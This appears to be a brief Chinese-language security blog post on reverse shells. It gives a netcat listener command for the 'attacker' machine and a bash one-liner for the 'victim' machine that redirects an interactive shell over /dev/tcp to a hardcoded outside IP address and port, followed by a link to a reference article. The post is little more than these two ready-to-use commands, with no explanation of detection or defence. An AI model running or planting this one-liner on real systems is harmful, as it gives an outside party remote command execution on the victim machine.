---
layout: post
title: 反弹shell
categories: 安全工具
description: 反弹shell
keywords: 反弹shell
---


## 执行反弹 shell 

我们就以最常见的bash为例：
`attacker`机器上执行：
```powershell

nc -lvvnp 2333
```


`victim `机器上执行：
```shell
bash -i >& /dev/tcp/101.33.66.29/2333 0>&1
```


https://xz.aliyun.com/t/2549